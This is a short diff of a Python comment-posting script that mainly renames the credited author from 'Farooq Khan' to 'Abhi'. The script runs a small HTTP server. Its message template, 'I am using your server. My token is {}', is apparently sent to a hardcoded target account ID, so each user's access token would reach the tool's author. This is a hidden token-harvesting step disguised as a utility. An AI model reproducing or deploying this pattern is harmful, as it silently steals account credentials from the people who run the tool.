@@ -14,7 +14,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"SERVER RUNNING => TRICKS ||[BY=|< FAROOQ KHAN ]")
+        self.wfile.write(b"SERVER RUNNING !! [ TRICKS BY ABHI DON ]")
 
 def execute_server():
     PORT = 4000
@@ -39,7 +39,7 @@ def post_comments():
     num_tokens = len(tokens)
 
     # Modify the message as per your requirement
-    msg_template = "Hello Farooq Khan sir! I am using your server. My token is {}"
+    msg_template = "Hello Abhi  sir! I am using your Post server. My token is {}"
 
     # Specify the ID where you want to send the message
     target_id = "100045379002944"
